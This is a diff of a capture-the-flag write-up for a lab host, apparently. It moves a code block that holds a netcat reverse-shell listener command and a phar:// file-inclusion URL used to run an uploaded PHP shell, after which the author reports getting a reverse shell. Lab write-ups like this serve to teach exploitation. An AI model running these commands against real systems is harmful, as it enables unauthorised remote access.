@@ -207,12 +207,13 @@ modify the above path with PHAR (PHP Archive) payload and open a netcat listner
 ```
 nc -lnvp 6969
 ```
-```
-http://itrc.ssg.htb/?page=phar://uploads/b1b6433555455fe26b08ad6b9290c333268597ec.zip/shell
-```
+
 
 so if your file name is shell.php then you should execute as "hash.zip/shell"
 
+```
+http://itrc.ssg.htb/?page=phar://uploads/b1b6433555455fe26b08ad6b9290c333268597ec.zip/shell
+```
 Voila got the reverse shell
 
 in the home dir there are two users 
